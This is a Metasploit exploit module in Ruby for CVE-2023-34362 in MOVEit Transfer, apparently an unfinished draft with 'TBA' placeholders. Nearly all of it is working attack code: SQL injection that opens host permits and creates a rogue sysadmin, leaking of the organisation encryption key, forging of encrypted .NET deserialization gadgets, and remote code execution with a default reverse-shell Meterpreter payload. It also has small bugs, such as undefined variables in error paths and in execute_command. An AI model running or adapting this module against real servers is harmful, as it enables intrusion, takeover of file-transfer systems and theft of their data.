##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# https://docs.google.com/document/d/11jEIf-zFXVqNzJ7JZW_Kc4YMyF4GkFo8o1LGl6NS01E/edit
# https://github.com/sfewer-r7/CVE-2023-34362
# https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis
# https://github.com/sfewer-r7/CVE-2023-34362/blob/main/CVE-2023-34362.rb
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  HEADERS = %w[X-siLock-AgentBrand X-siLock-AgentVersion X-siLock-CanAcceptCompress X-siLock-CanAcceptLumps X-siLock-CanCheckHash X-siLock-Challenge X-siLock-CheckVirus X-siLock-ClientType X-siLock-CS2-Allow204 X-siLock-CS2-AVDLP X-siLock-CS2-BlockOnError X-siLock-CS2-ChunkSizeKB X-siLock-CS2-ConnTimeoutSecs X-siLock-CS2-DoPreview X-siLock-CS2-Engine X-siLock-CS2-Error X-siLock-CS2-ISTag X-siLock-CS2-MaxFileSize X-siLock-CS2-Name X-siLock-CS2-RecvTimeoutSecs X-siLock-CS2-SendTimeoutSecs X-siLock-CS2-Tries X-siLock-CS2-Type X-siLock-CS2-URL X-siLock-CS-Allow204 X-siLock-CS-AVDLP X-siLock-CS-BlockOnError X-siLock-CS-ChunkSizeKB X-siLock-CS-ConnTimeoutSecs X-siLock-CS-DoPreview X-siLock-CS-Engine X-siLock-CS-Error X-siLock-CS-ISTag X-siLock-CS-MaxFileSize X-siLock-CS-Name X-siLock-CS-RecvTimeoutSecs X-siLock-CSRFToken X-siLock-CS-SendTimeoutSecs X-siLock-CS-Tries X-siLock-CS-URL X-siLock-DLPChecked X-siLock-DLPViolation X-siLock-DownloadToken X-siLock-Duration X-siLock-ErrorCode X-siLock-ErrorDescription X-siLock-FileID X-siLock-FileIDToDelete X-siLock-FilePath X-siLock-FileSize X-siLock-FolderID X-siLock-FolderPath X-siLock-FolderType X-siLock-Hash X-siLock-HashOK X-siLock-InstID X-siLock-IntegrityVerified X-siLock-IPAddress X-siLock-LangCode X-siLock-LoginName X-siLock-LogRecID X-siLock-MailboxOwner X-siLock-NotificationID X-siLock-OriginalFilename X-siLock-PackageID X-siLock-PartialFileID X-siLock-PartialFilePath X-siLock-Password X-siLock-RealName X-siLock-RelativePath X-siLock-ResumeInPlace X-siLock-SessionID X-siLock-SessVar X-siLock-TimeBegun X-siLock-TimeElapsed X-siLock-TimeEnded X-siLock-Transaction X-siLock-Untrusted X-siLock-UploadComment X-siLock-UserFilename X-siLock-Username X-siLock-VirusChecked X-siLock-XferFormat].freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TBA',
        'Description' => %q{
          TBA
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # PoC https://github.com/sfewer-r7/CVE-2023-34362
          'bwatters-r7' # module
        ],
        'References' => [
          ['CVE', '2023-34362' ],
          ['URL', 'https://github.com/sfewer-r7/CVE-2023-34362']
        ],
        'Platform' => 'win',
        'Arch' => [ARCH_X64, ARCH_CMD],
        'Targets' => [
          [
            'Windows Fetch',
            {
              'Arch' => ARCH_CMD,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp',
                'RPORT' => 443,
                'SSL' => true
              }
            }
          ],
        ],
        'DisclosureDate' => '2023-05-31',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
        }
      )
    )
    register_options(
      [
        Msf::OptString.new('TARGET_URI', [ false, 'Target URI', '/api/v1/token']),
        Msf::OptString.new('USERNAME', [ true, 'Username', Rex::Text.rand_text_alphanumeric(5..11)]),
        Msf::OptString.new('LOGIN_NAME', [ true, 'Login Name', Rex::Text.rand_text_alphanumeric(5..11)]),
        Msf::OptString.new('PASSWORD', [ true, 'Password', Rex::Text.rand_text_alphanumeric(5..11)])

      ]
    )
    @moveit_token = nil
    @moveit_instid = nil
    @cookies = nil
    @guest_email_addr = "#{Rex::Text.rand_text_alphanumeric(5..12)}@#{Rex::Text.rand_text_alphanumeric(3..6)}.com"
    @uploadfile_name = Rex::Text.rand_text_alphanumeric(8..15)
    @uploadfile_size = rand(5..64)
    @uploadfile_data = Rex::Text.rand_text_alphanumeric(@uploadfile_size)
  end

  def populate_token_instid
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'connection' => 'keep-alive',
        'accept' => '*/*'
      })

      @cookies = res.get_cookies
      vprint_status("Cookies: #{@cookies}")
      # Get the session id from the cookies
      if @cookies =~ /ASP.NET_SessionId=([a-z0-9]+);/
        @moveit_token = ::Regexp.last_match(1)
        vprint_status("@moveit_token = #{@moveit_token}")
      else
        fail_with(Msf::Exploit::Failure::Unknown, 'Could not find token from cookies!')
      end

      # Get the InstID from the cookies
      if @cookies =~ /siLockLongTermInstID=([0-9]+);/
        @moveit_instid = ::Regexp.last_match(1)
        vprint_status("@moveit_instid = #{@moveit_instid}")
      else
        fail_with(Msf::Exploit::Failure::Unknown, 'Could not find InstID from cookies!')
      end
    end
    return true
  end

  def sqli_payload(sql_payload)
    # Create the initial injection, and create the session object
    payload = [
      # The initial injection
      "#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.com')",
    ].concat(sql_payload)

    # Join our payload, and terminate with a comment character
    return payload.join(';') + ';#'
  end

  # Perform a request to the ISAPI endpoint with an arbitrary transaction
  def isapi_request(cookies, transaction, headers)
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('moveitisapi/moveitisapi.dll?action=m2'),
      'connection' => 'close',
      'accept' => '*/*',
      'cookie' => cookies,
      'headers' => {
        'X-siLock-Test': 'abcdX-SILOCK-Transaction: folder_add_by_path',
        'X-siLock-Transaction': transaction
      }.merge(headers)
    })
  end

  def set_session(token, session_hash)
    session_vars = {}
    session_index = 0
    session_hash.each_pair do |k, v|
      vprint_status("Setting #{k} => #{v}")
      session_vars.store("X-siLock-SessVar#{session_index}", "#{k}: #{v}")
      session_index += 1
    end
    isapi_request(token, 'session_setvars', session_vars)
  end

  def get_csrf_token(res)
    if res.to_s.split(/\n/).join =~ /.*csrftoken" value="([a-f0-9]*)"/
      return ::Regexp.last_match(1)
    else
      vprint_status("CSRF Token = #{r}")
      fail_with(Msf::Exploit::Failure::Unknown, 'No csrf token, or my code is bad')
    end
  end

  def guestaccess_request(cookies, body)
    vprint_status('guestaccess_request')
    vprint_status(cookies.to_s)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('guestaccess.aspx'),
      'connection' => 'close',
      'accept' => '*/*',
      'cookie' => @cookies,
      'vars_post' => body
    })
    res
  end

  def sqli(cookies, sql_payload)
    vprint_status('sqli')
    # Set up a fake package in the session. The order here is important. We set these session
    # variables one per request, so first set the package information, then switch over to a
    # 'Guest' username to allow the CSRF/injection to work as expected. If we don't do this
    # order the session will be cleared and the injection will not work.
    set_session(cookies, {
      'MyPkgAccessCode' => 'accesscode', # Must match the final request Arg06
      'MyPkgID' => '0', # Is self provisioned? (must be 0)
      'MyGuestEmailAddr' => @guest_email_addr, # Must be a valid email address @ MOVEit.DMZ.ClassLib.dll/MOVEit.DMZ.ClassLib/MsgEngine.cs
      'MyPkgInstID' => '1234', # this can be any int value
      'MyPkgSelfProvisionedRecips' => sql_payload,
      'MyUsername' => 'Guest'
    })

    # Get a CSRF token - this has to be *after* you set MyUsername, since the
    # username is incorporated into it
    #
    # Transaction => request type, different types will work
    # Arg06 => the package access code (must match what's set above)
    # Arg12 => promptaccesscode requests a form, which contains a CSRF code

    vprint_status('Getting CSRF token from guestaccess.aspx...')
    body = { 'Transaction' => 'dummy', 'Arg06' => 'accesscode', 'Arg12' => 'promptaccesscode' }
    csrf = get_csrf_token(guestaccess_request(cookies, body))
    vprint_status("CSRF token = #{csrf}")

    # This does the actual injection
    vprint_status('Triggering the payload via guestaccess.aspx...')
    body = {
      'Arg06' => 'accesscode',
      'transaction' => 'secmsgpost',
      'Arg01' => 'subject',
      'Arg04' => 'body',
      'Arg05' => 'sendauto',
      'Arg09' => 'pkgtest9',
      'csrftoken' => csrf
    }
    guestaccess_request(cookies, body)
  end

  def makev1password(password, salt = 'AAAA')
    raise 'password cannot be empty' if password.empty?

    raise 'salt must be 4 bytes' if salt.length != 4

    # These two hardcoded values are found in MOVEit.DMZ.Core.Cryptography.Providers.SecretProvider.GetSecret
    pwpre = Base64.decode64('=VT2jkEH3vAs=')

    pwpost = Base64.decode64('=0maaSIA5oy0=')

    md5 = Digest::MD5.new
    md5.update(pwpre)
    md5.update(salt)
    md5.update(password)
    md5.update(pwpost)

    pw = [(4 + 4 + 16), 0, 0, 0].pack('CCCC')
    pw << salt
    pw << md5.digest

    return Base64.strict_encode64(pw).gsub('+', '-')
  end

  def request_api_token
    vprint_status('request_api_token')
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/api/v1/token'),
      'Content-Type' => 'application/x-www-form-urlencoded',
      'connection' => 'keep-alive',
      'accept' => '*/*',
      'vars_post' => {
        'grant_type' => 'password',
        'username' => datastore['LOGIN_NAME'],
        'password' => datastore['PASSWORD']
      }
    })

    if res.code != 200
      fail_with(Msf::Exploit::Failure::Unknown, "Couldn't get API token (#{res.body})")
    end

    token_json = JSON.parse(res.body)

    vprint_status("Got API access token='#{token_json['access_token']}'.")
    token_json
  end

  def find_folder_id(token_json)
    folders_response = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/folders'),
      'connection' => 'close',
      'accept' => '*/*',
      'headers' => {
        'Authorization' => "Bearer #{token_json['access_token']}"
      }
    })
    if folders_response.code != 200
      fail_with(Msf::Exploit::Failure::Unknown, "Couldn't get API folders (#{folders_response.body})")
    end

    folders_json = JSON.parse(folders_response.body)

    vprint_status("Found folderId '#{folders_json['items'][0]['id']}'.")

    folders_json
  end

  def create_sysadmin
    vprint_status('create_sysadmin')
    hax_username = datastore['USERNAME']
    hax_password = datastore['PASSWORD']
    hax_loginname = datastore['LOGIN_NAME']
    createuser_payload = [

      "UPDATE moveittransfer.hostpermits SET Host='*.*.*.*' WHERE Host!='*.*.*.*'",

      "INSERT INTO moveittransfer.users (Username) VALUES ('#{hax_username}')",

      "UPDATE moveittransfer.users SET LoginName='#{hax_loginname}' WHERE Username='#{hax_username}'",

      "UPDATE moveittransfer.users SET InstID='#{@moveit_instid}' WHERE Username='#{hax_username}'",

      "UPDATE moveittransfer.users SET Password='#{makev1password(hax_password, Rex::Text.rand_text_alphanumeric(4))}' WHERE Username='#{hax_username}'",

      "UPDATE moveittransfer.users SET Permission='40' WHERE Username='#{hax_username}'",

      "UPDATE moveittransfer.users SET CreateStamp=NOW() WHERE Username='#{hax_username}'",
    ]
    res = sqli(@cookies, sqli_payload(createuser_payload))

    if res.code != 200
      fail_with(Msf::Exploit::Failure::Unknown, "Couldn't perform initial SQLi (#{res.body})")
    end
  end

  def begin_file_upload(folders_json, token_json)
    boundary = rand_text_numeric(27)
    data = "--#{boundary}\r\n"
    data << 'Content-Disposition: form-data;'
    data << "name=\"name\"\r\n\r\n#{@uploadfile_name}\r\n--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"size\"\r\n\r\n#{@uploadfile_size}\r\n--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"comments\"\r\n\r\n\r\n--#{boundary}--\r\n"

    res = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri("/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable"),
      'headers' => {
        'Content-Type' => 'multipart/form-data; boundary=' + boundary,
        'Authorization' => "Bearer #{token_json['access_token']}"
      },
      'connection' => 'close',
      'accept' => '*/*',
      'data' => data
    })

    if res.code != 200
      fail_with(Msf::Exploit::Failure::Unknown, "Couldn't post API files #1 (#{files_response.body})")
    end

    files_json = JSON.parse(res.body)

    vprint_status("Initiated resumable file upload for fileId '#{files_json['fileId']}'...")

    files_json
  end

  def leak_encryption_key(token_json, files_json)
    haxleak_payload = [
      # The \ gets escaped, so we leverage CHAR_LENGTH(39) to get the key we want (Standard Networks\siLock\Institutions\0) as all other KeyName's will be longer (Standard Networks\siLock\Institutions\1234)
      "UPDATE moveittransfer.files SET UploadAgentBrand=(SELECT PairValue FROM moveittransfer.registryaudit WHERE PairName='Key' AND CHAR_LENGTH(KeyName)=#{'Standard Networks\siLock\Institutions\0'.length}) WHERE ID='#{files_json['fileId']}'"
    ]

    sqli(@cookies, sqli_payload(haxleak_payload))

    leak_response = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("/api/v1/files/#{files_json['fileId']}"),
      'connection' => 'close',
      'accept' => '*/*',
      'headers' => {
        'Authorization' => "Bearer #{token_json['access_token']}"
      }
    })

    if leak_response.code != 200
      fail_with(Msf::Exploit::Failure::Unknown, "Couldn't post API files #LEAK (#{leak_response.body})")
    end

    leak_json = JSON.parse(leak_response.body)

    org_key = leak_json['uploadAgentBrand']

    vprint_status("Leaked the Org Key: #{org_key}")

    org_key
  end

  def moveitv2encrypt(data, org_key, iv = nil, tag = '@%!')
    raise 'org_key must be 16 bytyes' if org_key.length != 16

    if iv.nil?
      iv = Rex::Text.rand_text_alphanumeric(4)
      # as we only store the first 4 bytes in the header, the IV must be a repeating 4 byte sequence.
      iv *= 4
    end

    # MOVEit.DMZ.Core.Cryptography.Encryption
    key = [64, 131, 232, 51, 134, 103, 230, 30, 48, 86, 253, 157].pack('C*')
    key += org_key
    key += [0, 0, 0, 0].pack('C*')

    # MOVEit.Crypto.AesMOVEitCryptoTransform
    cipher = OpenSSL::Cipher.new('AES-256-CBC')

    cipher.encrypt
    cipher.key = key
    cipher.iv = iv
    encrypted_data = cipher.update(data) + cipher.final
    data_sha1_hash = Digest::SHA1.digest(data).unpack('C*')
    org_key_sha1_hash = Digest::SHA1.digest(org_key).unpack('C*')

    # MOVEit.DMZ.Core.Cryptography.Providers.MOVEit.MOVEitV2EncryptedStringHeader
    header = [
      225, # MOVEitV2EncryptedStringHeader
      0,
      data_sha1_hash[0],
      data_sha1_hash[1],
      org_key_sha1_hash[0],
      org_key_sha1_hash[1],
      org_key_sha1_hash[2],
      org_key_sha1_hash[3],
      iv.unpack('C*')[0],
      iv.unpack('C*')[1],
      iv.unpack('C*')[2],
      iv.unpack('C*')[3],
    ].pack('C*')

    # MOVEit.DMZ.Core.Cryptography.Encryption
    return tag + Base64.strict_encode64(header + encrypted_data)
  end

  def encrypt_deserialization_gadget(gadget, org_key)
    org_key.gsub!(' ', '')
    org_key = [org_key].pack('H*').bytes.to_a.pack('C*')
    deserialization_gadget = moveitv2encrypt(gadget, org_key)
    vprint_status(deserialization_gadget)
    deserialization_gadget
  end

  def upload_encrypted_gadget(encrypted_gadget, files_json)
    haxupload_payload = [
      "UPDATE moveittransfer.fileuploadinfo SET State='#{encrypted_gadget}' WHERE FileID='#{files_json['fileId']}'",
    ]
    vprint_status('Planting encrypted gadget into the DB...')
    sqli(@cookies, sqli_payload(haxupload_payload))
  end

  def trigger_deserialization(token_json, files_json, folders_json)
    print_status('Triggering gadget deserialization...')
    files_response = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri("/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable&fileId=#{files_json['fileId']}"),
      'connection' => 'close',
      'accept' => '*/*',
      'verify' => false,
      'headers' => {
        'Authorization' => "Bearer #{token_json['access_token']}",
        'Content-Type' => 'application/octet-stream',
        'Content-Range' => "bytes 0-#{@uploadfile_size - 1}/#{@uploadfile_size}",
        'X-File-Hash' => Digest::SHA1.hexdigest(@uploadfile_data)
      },
      'data' => @uploadfile_data[0, @uploadfile_data.length]
    })

    # 500 if payload runs :)
    if files_response.code != 500
      raise "Couldn't post API files #2 code=#{files_response.code} (#{files_response.body})"
    end

    vprint_status('Gadget deserialized, RCE Achieved!')

    vprint_status(files_response.body)
  end

  def execute_command(cmd, _opts = {})
    gadget = ::Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter
    )
    # gadget = powershell_escape(gadget)
    vprint_status(payload.encoded)
    vprint_status(gadget)
    b64_gadget = Rex::Text.encode_base64(gadget)
    vprint_status('Encrypting b64 gadget')
    encrypted_gadget = encrypt_deserialization_gadget(b64_gadget, org_key)
    upload_encrypted_gadget(encrypted_gadget, files_json)
    vprint_status("uploading fileid #{files_json['fileId']} to folderid #{folders_json['items'][0]['id']}")
    trigger_deserialization(token_json, files_json, folders_json)
  end

  def exploit
    # Get the sessionID and siLockLongTermInstID
    vprint_status('Calling populate_token_instid')
    populate_token_instid
    # Allow Remote Access and Create new sysAd
    vprint_status('Creating Sysadmin')
    create_sysadmin
    vprint_status('Getting request_api_token')
    token_json = request_api_token
    vprint_status('Getting folder_id')
    folders_json = find_folder_id(token_json)
    vprint_status('Starting file upload')
    files_json = begin_file_upload(folders_json, token_json)
    vprint_status('Leaking encryption key')
    org_key = leak_encryption_key(token_json, files_json)
    # gadget = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAugU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5vdGVwYWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs="
    gadget = ::Msf::Util::DotNetDeserialization.generate(
      payload.encoded,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter
    )
    vprint_status(gadget)
    b64_gadget = Rex::Text.encode_base64(gadget)
    vprint_status('Encrypting b64 gadget')
    encrypted_gadget = encrypt_deserialization_gadget(b64_gadget, org_key)
    upload_encrypted_gadget(encrypted_gadget, files_json)
    # vprint_status("uploading fileid #{files_json["fileId']} to folderid #{folders_json['items'][0]['id']}")
    trigger_deserialization(token_json, files_json, folders_json)
  end
end
